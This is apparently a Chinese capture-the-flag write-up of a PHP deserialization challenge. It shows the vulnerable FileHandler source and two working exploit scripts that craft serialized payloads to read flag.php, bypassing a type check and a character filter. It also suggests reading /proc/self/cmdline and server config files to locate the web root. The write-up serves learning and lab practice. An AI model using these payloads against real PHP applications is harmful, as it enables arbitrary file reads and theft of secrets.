# 考察知识点：

1.php7.1+版本对属性类型不敏感

2.反序列化



反思：该题的知识点，protected类型序列化时产生不可显示字符，题目对此做了限制

该知识点可在p神星球中找到，搜索也能找到一个关键字php7.1+版本对属性类型不敏感，应该深入下去。



```javascript
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

//确保输入的字符串ascii在32-125之间
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125)){
            echo "失败lalalal";
            return false;
        }

    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```



write函数不能利用，__destruct（）将content替换为空，不能用来写shell

设置 op为2，利用reder读取flag.php文件

```javascript
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
```



利用==和===的差异，设置op=2可以绕过__destruct的限制



exp:

```javascript
<?php

class FileHandler {

    protected $op = 2;
    protected $filename = "/var/www/html/flag.php";
}

$fh=new FileHandler();
$s=serialize($fh);


$s=str_replace(chr(0),'\00',serialize($fh));
echo urlencode(str_replace('s','S',$s));

```



其中需要使用绝对路径，不能直接flag.php。绝对路径可通过读取

/proc/self/cmdline 查看正在运行的进程得到httpd配置文件

/web/config/httpd.conf拿到web根目录

/web/html/flag.php拿到flag存储位置



也可以通过伪协议读取flag.php



exp2:

php7.1+版本对属性类型不敏感，直接修改类型为public绕过

```javascript
<?php
//https://www.t00ls.net/articles-56352.html
class FileHandler {

    public $op = 2;
    public $filename = "/var/www/html/flag.php";
}

$fh=new FileHandler();
echo urlencode(serialize($fh));
```





